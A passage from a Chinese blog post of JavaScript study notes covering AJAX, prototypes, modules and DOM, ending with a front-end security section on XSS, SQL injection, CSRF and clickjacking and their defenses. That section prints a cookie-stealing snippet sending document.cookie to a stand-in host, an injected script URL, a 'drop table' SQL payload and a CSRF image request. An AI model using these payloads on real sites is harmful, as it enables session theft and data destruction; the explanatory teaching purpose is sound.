+<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p>json的全称为JavaScript Object Notation，即对象表示法，是一种约定的数据格式。</p>
+<hr>
+<h2 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h2><p>ajax的全称为Asynchronous JavaScript and XML，即异步的JavaScript和XML，<br>理解它的过程很简单，就是用JS发起一个请求，并得到服务器返回的内容，原生JS写法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">//第1步 声明一个对象</div><div class="line">var request; </div><div class="line">//第2步 根据浏览器赋予对象http请求的方法</div><div class="line">if (window.XMLHttpRequest) &#123; //code for IE7+, Firefox, Chrome, Opera, Safari</div><div class="line">  request = new XMLHttpRequest();</div><div class="line">&#125; else &#123; //code for IE6, IE5</div><div class="line">  request = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</div><div class="line">&#125;</div><div class="line">//第3步 确定服务器返回的方法</div><div class="line">request.onreadystatechange = function () &#123;</div><div class="line">  if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</div><div class="line">    console.log(request.responseText);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">//第4步 在之前声明的基础上发起请求</div><div class="line">request.open(&quot;GET&quot;,&quot;filename&quot;,true);</div><div class="line">request.send();</div></pre></td></tr></table></figure></p>
+<p>注意以下要点：</p>
+<p>IE6及以下版本用的是ActiveXObject方法，其余用XMLHttpRequest方法。</p>
+<p><strong>XMLHttpRequest</strong>对象三个重要的属性：</p>
+<p><strong>onreadystagechange</strong> 存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。</p>
+<p><strong>readyState</strong> 存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。<br>0: 请求未初始化<br>1: 服务器连接已建立<br>2: 请求已接收<br>3: 请求处理中<br>4: 请求已完成，且响应已就绪</p>
+<p><strong>status</strong><br>200：”ok”<br>404：未找到页面</p>
+<p>XMLHttpRequest对象的open()和send()方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">open(method,url,async);</div><div class="line">//规定请求的类型、URL 以及是否异步处理请求。</div><div class="line">//method：请求的类型；GET 或 POST</div><div class="line">//url：文件在服务器上的位置</div><div class="line">//async：true（异步）或 false（同步）</div><div class="line"></div><div class="line">send(string);	</div><div class="line">//将请求发送到服务器。</div><div class="line">//string：仅用于 POST 请求</div></pre></td></tr></table></figure></p>
+<p>与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。<br>然而，在以下情况中，请使用 POST 请求：<br>1.无法使用缓存文件（更新服务器上的文件或数据库）<br>2.向服务器发送大量数据（POST 没有数据量限制）<br>3.发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</p>
+<p>jQuery封装了AJAX的方法，只需要一行代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$.get(&apos;filename&apos;).then(function(response)&#123;</div><div class="line">  //do something</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="原型继承与扩展"><a href="#原型继承与扩展" class="headerlink" title="原型继承与扩展"></a>原型继承与扩展</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Child.prototype = new Parent();</div></pre></td></tr></table></figure>
+<p>把父类对象赋值给子类构造函数的原型，这样子类就可以访问到父类以及父类的原型，这就叫<strong>原型继承</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">function Person(name) &#123;</div><div class="line">  this.name = name;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Person.prototype.sayHello = function() &#123;</div><div class="line">  alert (&quot;hello, I&apos;m&quot; + this.name);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">var BillGates = new Person(&quot;Bill Gates&quot;); //建立对象</div><div class="line">BillGates.sayHello(); //hello, I&apos;m Bill Gates</div><div class="line"></div><div class="line">Person.prototype.Retire = function() &#123;</div><div class="line">  alert(&quot;poor&quot;+this.name+&quot;byebye!&quot;);</div><div class="line">&#125; //建立对象后再动态扩展</div><div class="line"></div><div class="line">BillGates.Retire(); //poor BillGates byebye!</div></pre></td></tr></table></figure>
+<p>这种建立对象后再动态扩展的情况，就叫做原型扩展，新方法仍然可被之前建立的对象调用</p>
+<hr>
+<h2 id="js延迟加载"><a href="#js延迟加载" class="headerlink" title="js延迟加载"></a>js延迟加载</h2><p>defer和async是动态创建dom的两种方式，defer是延迟加载，async是异步下载脚本<br>在其他情况下，浏览器会按照script元素在页面中出现的顺序依次进行解析</p>
+<hr>
+<h2 id="封装与模块化开发"><a href="#封装与模块化开发" class="headerlink" title="封装与模块化开发"></a>封装与模块化开发</h2><p>使代码规范好用，使用简单化，只需要知道参数和返回值，可以转化编程思维角度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">var modulel = (function()&#123;</div><div class="line">  var _count = 0;</div><div class="line">  var m1 = function()&#123;</div><div class="line">  //...</div><div class="line">  &#125;</div><div class="line">  var m2 = function()&#123;</div><div class="line">  //...</div><div class="line">  &#125;</div><div class="line">  return &#123;</div><div class="line">    m1:m1,</div><div class="line">    m2:m2</div><div class="line">  &#125;;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="跨域问题的解决方法"><a href="#跨域问题的解决方法" class="headerlink" title="跨域问题的解决方法"></a>跨域问题的解决方法</h2><p>1.jsonp(jQuery的$.getScript方法就是利用jsonp跨域解决的)<br>2.iframe<br>3.window.name<br>4.window.postMessage<br>5.服务器上设置代理页面</p>
+<hr>
+<h2 id="DOM操作"><a href="#DOM操作" class="headerlink" title="DOM操作"></a>DOM操作</h2><p>（1）创建新节点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">createDocumentFragment() //创建一个DOM片段</div><div class="line">createElement() //创建一个具体元素</div><div class="line">createTextNode() //创建一个文本节点</div></pre></td></tr></table></figure></p>
+<p>（2）添加、移除、替换、插入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">appendChild()</div><div class="line">removeChild()</div><div class="line">replaceChild()</div><div class="line">insertBefore() //在已有子节点前插入新的节点</div></pre></td></tr></table></figure></p>
+<p>（3）查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">getElementsByTagName() //通过标签名称</div><div class="line">getElementsByName() //通过元素Name属性值</div><div class="line">getElementById() //通过元素id，唯一，所以Element没有s</div></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="前端模块化开发"><a href="#前端模块化开发" class="headerlink" title="前端模块化开发"></a>前端模块化开发</h2><h3 id="发展历程"><a href="#发展历程" class="headerlink" title="发展历程"></a>发展历程</h3><p>1.函数封装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">function f1 () &#123;</div><div class="line">  statement</div><div class="line">&#125;</div><div class="line">function f2 () &#123;</div><div class="line">  statement</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>污染了全局变量，容易发生冲突，且模块成员之间没有联系<br><br><br>2.对象的写法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var myModule = &#123;</div><div class="line">  var1: 1,</div><div class="line">  var2: 2,</div><div class="line">  fn1: function () &#123; &#125;,</div><div class="line">  fn2: function () &#123; &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>调用myModule.fn2(); 避免了变量污染，只需要保证模块名唯一即可<br>缺陷是外部可以随意修改内部成员：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">myModule.var1 = 100;</div></pre></td></tr></table></figure></p>
+<p><br><br>3.立即执行函数的写法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">var myModule = (function()&#123;</div><div class="line">  var var1 = 1;</div><div class="line">  var var2 = 2;</div><div class="line">  function fn1 () &#123; &#125;;</div><div class="line">  function fn2 () &#123; &#125;;</div><div class="line">  return &#123;</div><div class="line">    fn1: fn1,</div><div class="line">    fn2: fn2</div><div class="line">  &#125;;</div><div class="line">&#125;) ();</div><div class="line"></div><div class="line">console.info(myModule.var1); //underfined</div></pre></td></tr></table></figure></p>
+<p>这样就无法修改暴露出来的变量和函数，就是模块化的基础。</p>
+<h3 id="模块化的规范-CMD和AMD"><a href="#模块化的规范-CMD和AMD" class="headerlink" title="模块化的规范 CMD和AMD"></a>模块化的规范 CMD和AMD</h3><p><strong>commonJS 通用模块定义</strong><br>1.定义模块<br>每一个模块都是一个单独的作用域，无法被其他模块读取<br>2.模块输出<br>模块只有一个出口，module.exports对象，把模块希望输出的全部内容放入该对象<br>3.加载模块<br>加载模块使用require方法，该方法读取一个文件并执行返回文件内部的module.exports对象</p>
+<p>例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">//模块定义myModel.js</div><div class="line">var name = &apos;Byron&apos;;</div><div class="line">function printName () &#123;</div><div class="line">  console.log(name);</div><div class="line">&#125;</div><div class="line">function printFullName(firstName) &#123;</div><div class="line">  console.log(firstName + name);</div><div class="line">&#125;</div><div class="line">module.exports = &#123;</div><div class="line">  printName: printName,</div><div class="line">  printFullName: printFullName</div><div class="line">&#125;</div><div class="line"></div><div class="line">//加载模块</div><div class="line">var nameModule = require(./myModel.js);</div><div class="line">nameModule.printName</div></pre></td></tr></table></figure></p>
+<p><strong>AMD 异步模块定义</strong> </p>
+<hr>
+<h2 id="前端安全问题"><a href="#前端安全问题" class="headerlink" title="前端安全问题"></a>前端安全问题</h2><p>web常见攻击手段：</p>
+<h3 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h3><h4 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h4><p>它是通过诱使用户打开一个恶意链接，服务端将链接中参数的恶意代码渲染到页面中，再传递给用户由浏览器执行，从而达到攻击的目的。如下面的链接：</p>
+<p><code>http://a.com/a.jsp?name=xss&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p>a.jsp将页面渲染成下面的html：</p>
+<p><code>Hello xss&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p>这时浏览器将会弹出提示框。</p>
+<p>这算是常见的一种方法，预防的话可以通过后台编写方法来拦截过滤到这些非法或有攻击性的字符。</p>
+<h4 id="2-持久型XSS"><a href="#2-持久型XSS" class="headerlink" title="2.持久型XSS"></a>2.持久型XSS</h4><p>持久型XSS将恶意代码提交给服务器，并且存储在服务器端，当用户访问相关内容时再渲染到页面中，以达到攻击的目的，它的危害更大。</p>
+<p>比如，攻击者写了一篇带恶意JS代码的博客，文章发表后，所有访问该博客文章的用户都会执行这段恶意JS。</p>
+<p>这个相对来说对我们开发网站来说不算重要，但是要小心攻击者在你网站注入一些非法代码，从而达到这个目的。</p>
+<h4 id="3-Cookie劫持"><a href="#3-Cookie劫持" class="headerlink" title="3.Cookie劫持"></a>3.Cookie劫持</h4><p>Cookie中一般保存了当前用户的登录凭证，如果可以得到，往往意味着可直接进入用户帐户，而Cookie劫持也是最常见的XSS攻击。以上面提过的反射型XSS的例子来说，可以像下面这样操作：</p>
+<p>首先诱使用户打开下面的链接：</p>
+<p><code>http://a.com/a.jsp?name=xss&lt;script src=http://b.com/b.js&gt;&lt;/script&gt;</code></p>
+<p>用户打开链接后，会加载b.js，并执行b.js中的代码。b.js中存储了以下JS代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var img = document.createElement(&quot;img&quot;);</div><div class="line">img.src = &quot;http://b.com/log?&quot; + escape(document.cookie);</div><div class="line">document.body.appendChild(img);</div></pre></td></tr></table></figure>
+<p>上面的代码会向b.com请求一张图片，但实际上是将当前页面的cookie发到了b.com的服务器上。这样就完成了窃取cookie的过程。</p>
+<p>防御Cookie劫持的一个简单的方法是在Set-Cookie时加上HttpOnly标识，浏览器禁止JavaScript访问带HttpOnly属性的Cookie。</p>
+<h4 id="4-XSS的防御"><a href="#4-XSS的防御" class="headerlink" title="4.XSS的防御"></a>4.XSS的防御</h4><h5 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h5><p>对输入数据做检查，比如用户名只允许是字母和数字，邮箱必须是指定格式。<br>一定要在后台做检查，否则数据可能绕过前端检查直接发给服务器。<br>一般前后端都做检查，这样前端可以挡掉大部分无效数据。<br>对特殊字符做编码或过滤，但因为不知道输出时的语境，所以可能会做不适当的过滤，最好是在输出时具体情况具体处理。</p>
+<h5 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h5><p>对渲染到HTML中内容执行HtmlEncode，对渲染到JavaScript中的内容执行JavascriptEncode。<br>另外还可以使用一些<strong>做XSS检查的开源项目</strong>。</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>SQL注入常常会听到，它与XSS类似，是由于用户提交的数据被当成命令来执行而造成的。下面是一个SQL注入的例子：</p>
+<p><code>String sql = &quot;select * from user where username = &#39;&quot; + username + &quot;&#39;&quot;;</code></p>
+<p>像上面的SQL语句，如果用户提交的username参数是leo，则数据库执行的SQL为：</p>
+<p><code>select * from user where username = &#39;leo&#39;</code></p>
+<p>但如果用户提交的username参数是leo’; drop table user–，那执行的SQL为：</p>
+<p><code>select * from user where username = &#39;leo&#39;; drop table user--&#39;</code></p>
+<p>在查询数据后，又执行了一个删除表的操作，这样的后果非常严重。</p>
+<h4 id="SQL注入的防御"><a href="#SQL注入的防御" class="headerlink" title="SQL注入的防御"></a>SQL注入的防御</h4><p>防止SQL注入最好的方法是使用预编译语句，如下面所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">String sql = &quot;select * from user where username = ?&quot;;</div><div class="line">PreparedStatement pstmt = conn.prepareStatement(sql);</div><div class="line">pstmt.setString(1, username);</div><div class="line">ResultSet results = pstmt.executeQuery();</div></pre></td></tr></table></figure>
+<p>不同语言的预编译方法不同，但基本都可以处理。</p>
+<p>如果遇到无法使用预编译方法时，只能像防止XSS那样对参数进行检查和编码。</p>
+<h3 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h3><p>跨站请求伪造的英文全称是Cross Site Request Forgery，是由于操作所需的所有参数都能被攻击者得到，进而构造出一个伪造的请求，在用户不知情的情况下被执行。看下面一个例子：</p>
+<p>如果a.com网站需要用户登录后可以删除博客，删除博客的请求地址如下：</p>
+<p><code>GET http://a.com/blog/delete?id=1</code></p>
+<p>当用户登录a.com后，又打开了<a href="http://b.com/b.html，其中有下面的内容：" target="_blank" rel="external">http://b.com/b.html，其中有下面的内容：</a></p>
+<p><code>![](http://a.com/blog/delete?id=1)</code></p>
+<p>这时会以用户在a.com的身份发送<a href="http://a.com/blog/delete?id=1，删除那篇博客。" target="_blank" rel="external">http://a.com/blog/delete?id=1，删除那篇博客。</a></p>
+<h4 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h4><h5 id="1-验证码"><a href="#1-验证码" class="headerlink" title="1.验证码"></a>1.验证码</h5><p>CSRF是在用户不知情的情况下构造的网络情况，验证码则强制用户与应用交互，所以验证码可以很好得防止CSRF。但不能什么请求都加验证码。</p>
+<h5 id="2-referer检查"><a href="#2-referer检查" class="headerlink" title="2.referer检查"></a>2.referer检查</h5><p>检查请求header中的referer也能帮助防止CSRF攻击，但服务器不是总能拿到referer，浏览器可能出于安全或隐私而不发送referer，所以也不常用。倒是图片防盗链中用得很多。</p>
+<h5 id="3-Anti-CSRF-Token"><a href="#3-Anti-CSRF-Token" class="headerlink" title="3.Anti CSRF Token"></a>3.Anti CSRF Token</h5><p>更多的是生成一个随机的token，在用户提交数据的同时提交这个token，服务器端比对后如果不正确，则拒绝执行操作。</p>
+<h3 id="点击劫持（ClickJacking）"><a href="#点击劫持（ClickJacking）" class="headerlink" title="点击劫持（ClickJacking）"></a>点击劫持（ClickJacking）</h3><p>点击劫持是从视觉上欺骗用户。攻击者使用一个透明的iframe覆盖在一个网页上，诱使用户在该网页上操作，而实际点击却是点在透明的iframe页面。</p>
+<p>点击劫持延伸出了很多攻击方式，有图片覆盖攻击、拖拽劫持等。</p>
+<h4 id="点击劫持的防御"><a href="#点击劫持的防御" class="headerlink" title="点击劫持的防御"></a>点击劫持的防御</h4><p>针对iframe的攻击，可使用一个HTTP头：X-Frame-Options，它有三种可选值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">DENY： 禁止任何页面的frame加载；</div><div class="line">SAMEORIGIN：只有同源页面的frame可加载；</div><div class="line">ALLOW-FROM：可定义允许frame加载的页面地址。</div></pre></td></tr></table></figure>
+<p>针对图片覆盖攻击，则注意使用预防XSS的方法，防止HTML和JS注入。</p>
+<h3 id="常用的防御代码"><a href="#常用的防御代码" class="headerlink" title="常用的防御代码"></a>常用的防御代码</h3><p>登录的字符检测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">//过滤非法字符串</div><div class="line">function validate(value) &#123;</div><div class="line">    var pattern = /[`~!@#$%^&amp;*()_+&lt;&gt;?:&quot;&#123;&#125;,.\/;&apos;[\]]/im;</div><div class="line">    if (value === &apos;&apos; || value === null) return false;</div><div class="line">    if (pattern.test(value)) &#123;</div><div class="line">        alert(&quot;非法字符！&quot;);</div><div class="line">        return false;</div><div class="line">    &#125;</div><div class="line">    return true;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//过滤非法字符</div><div class="line">function filterSqlStr(value) &#123;</div><div class="line">    var str = &quot;and,delete,or,exec,insert,select,union,update,count,*,&apos;,join,&gt;,&lt;&quot;;</div><div class="line">    var sqlStr = str.split(&apos;,&apos;);</div><div class="line">    var flag = true;</div><div class="line"></div><div class="line">    for (var i = 0; i &lt; sqlStr.length; i++) &#123;</div><div class="line">        if (value.toLowerCase().indexOf(sqlStr[i]) != -1) &#123;</div><div class="line">            flag = false;</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    alert(flag);</div><div class="line">    return flag;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>continue…</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/JavaScript/" rel="tag"># JavaScript</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/22/运用flex布局技巧/" rel="next" title="运用flex布局技巧">
+                <i class="fa fa-chevron-left"></i> 运用flex布局技巧
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/22/hexo-next搭建个人博客的过程/" rel="prev" title="hexo+next搭建个人博客的过程">
+                hexo+next搭建个人博客的过程 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/avatar.gif"
+              alt="KevinLau" />
+          
+            <p class="site-author-name" itemprop="name">KevinLau</p>
+            <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives">
+            
+                <span class="site-state-item-count">28</span>
+                <span class="site-state-item-name">文章</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分類</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">34</span>
+                <span class="site-state-item-name">標籤</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Kevin031" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>GitHub</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/2122637140" target="_blank" title="微博">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>微博</a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#作用域"><span class="nav-number">1.</span> <span class="nav-text">作用域</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数据类型"><span class="nav-number">2.</span> <span class="nav-text">数据类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#boolean类型转换"><span class="nav-number">3.</span> <span class="nav-text">boolean类型转换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正则表达式"><span class="nav-number">4.</span> <span class="nav-text">正则表达式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#变量提升"><span class="nav-number">5.</span> <span class="nav-text">变量提升</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#函数调用的四种方法"><span class="nav-number">6.</span> <span class="nav-text">函数调用的四种方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原型链"><span class="nav-number">7.</span> <span class="nav-text">原型链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#闭包"><span class="nav-number">8.</span> <span class="nav-text">闭包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#this"><span class="nav-number">9.</span> <span class="nav-text">this</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#new操作"><span class="nav-number">10.</span> <span class="nav-text">new操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#事件类型"><span class="nav-number">11.</span> <span class="nav-text">事件类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UI事件"><span class="nav-number">11.1.</span> <span class="nav-text">UI事件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#焦点事件"><span class="nav-number">11.2.</span> <span class="nav-text">焦点事件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#鼠标与滚轮事件"><span class="nav-number">11.3.</span> <span class="nav-text">鼠标与滚轮事件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#键盘与文本事件"><span class="nav-number">11.4.</span> <span class="nav-text">键盘与文本事件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变动事件"><span class="nav-number">11.5.</span> <span class="nav-text">变动事件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#H5事件"><span class="nav-number">11.6.</span> <span class="nav-text">H5事件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#触摸与手势事件"><span class="nav-number">11.7.</span> <span class="nav-text">触摸与手势事件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM事件处理程序"><span class="nav-number">12.</span> <span class="nav-text">DOM事件处理程序</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM0级事件处理程序"><span class="nav-number">12.1.</span> <span class="nav-text">DOM0级事件处理程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM2级事件处理程序"><span class="nav-number">12.2.</span> <span class="nav-text">DOM2级事件处理程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跨浏览器的事件处理程序（封装）"><span class="nav-number">12.3.</span> <span class="nav-text">跨浏览器的事件处理程序（封装）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#事件委托的原理以及优缺点"><span class="nav-number">13.</span> <span class="nav-text">事件委托的原理以及优缺点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原生Javascript实现事件代理"><span class="nav-number">14.</span> <span class="nav-text">原生Javascript实现事件代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#事件冒泡和事件捕获"><span class="nav-number">15.</span> <span class="nav-text">事件冒泡和事件捕获</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSON"><span class="nav-number">16.</span> <span class="nav-text">JSON</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AJAX"><span class="nav-number">17.</span> <span class="nav-text">AJAX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原型继承与扩展"><span class="nav-number">18.</span> <span class="nav-text">原型继承与扩展</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#js延迟加载"><span class="nav-number">19.</span> <span class="nav-text">js延迟加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#封装与模块化开发"><span class="nav-number">20.</span> <span class="nav-text">封装与模块化开发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#跨域问题的解决方法"><span class="nav-number">21.</span> <span class="nav-text">跨域问题的解决方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM操作"><span class="nav-number">22.</span> <span class="nav-text">DOM操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前端模块化开发"><span class="nav-number">23.</span> <span class="nav-text">前端模块化开发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#发展历程"><span class="nav-number">23.1.</span> <span class="nav-text">发展历程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#模块化的规范-CMD和AMD"><span class="nav-number">23.2.</span> <span class="nav-text">模块化的规范 